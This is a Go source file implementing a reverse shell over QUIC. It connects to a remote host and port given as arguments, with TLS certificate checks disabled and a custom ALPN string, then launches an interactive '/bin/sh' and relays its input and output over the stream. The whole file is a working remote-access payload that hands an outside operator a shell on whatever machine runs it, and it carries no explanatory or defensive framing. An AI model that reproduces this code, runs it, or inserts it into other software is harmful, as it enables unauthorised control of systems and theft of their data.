package main

import (
    "context"
    "crypto/tls"
    "io"
    "os"
    "os/exec"
    "sync"
    "time"

    "github.com/quic-go/quic-go"
)

func main() {
    //Disable auto warning about increasing UDP buffer size
    os.Setenv("QUIC_GO_DISABLE_RECEIVE_BUFFER_WARNING", "true")

    tlsConf := &tls.Config {
        InsecureSkipVerify: true,
        NextProtos: []string{"abracadabra"}, //This needs to match the string on the server
    }

    quicConfig := &quic.Config {
        MaxIdleTimeout:  120 * time.Second,
        KeepAlivePeriod: 10 * time.Second,
    }

    ctx := context.Background()
    srvAddr := os.Args[1] + ":" + os.Args[2]
    conn, err := quic.DialAddr(ctx, srvAddr, tlsConf, quicConfig)
    if err != nil {
        print(err)
        return
    }
    defer conn.CloseWithError(0, "")

    stream, err := conn.OpenStreamSync(ctx)
    if err != nil {
        return
    }
    defer stream.Close()

    cmd := exec.Command("/bin/sh", "-i")
    stdin, _ := cmd.StdinPipe()
    stdout, _ := cmd.StdoutPipe()
    stderr, _ := cmd.StderrPipe()

    if err := cmd.Start(); err != nil {
        return
    }

    var wg sync.WaitGroup
    wg.Add(3)

    go func() {
        defer wg.Done()
        io.Copy(stdin, stream)
    }()

    go func() {
        defer wg.Done()
        io.Copy(stream, stdout)
    }()

    go func() {
        defer wg.Done()
        io.Copy(stream, stderr)
    }()

    go func() {
        cmd.Wait()
        stream.Close()
        conn.CloseWithError(0, "")
    }()

    wg.Wait()
    //cmd.Wait()
}
